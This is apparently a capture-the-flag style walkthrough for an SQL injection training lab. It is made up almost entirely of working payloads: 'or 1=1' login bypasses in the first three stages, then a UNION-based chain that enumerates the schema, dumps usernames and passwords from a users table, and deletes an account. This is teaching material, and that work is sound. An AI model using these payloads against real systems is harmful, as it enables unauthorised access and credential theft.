# Walkthrough document

## stage1
raw sqli in username: a' or 1=1 -- 

## stage2
raw sqli in password: a' or 1=1 -- 

## stage3
a' (or 1=1 and username="admin")) -- 
a' or 1=1) order by username desc -- 

## stage4
register and login
sqli in search: 
order by 4
union select database(), 'a', 1, 1 -- 
union select table_name, 'a', 1, 1 from information_schema.tables where schema_name="sqli_training" -- 
union select column_name, 'a', 1, 1 from information_schema.tables where table_name="harry_users" -- 
union select username, password, 1, 1 from harry_users -- 
login as Voldemort and delete it


## References

- SQL Injection Cheat Sheet - http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet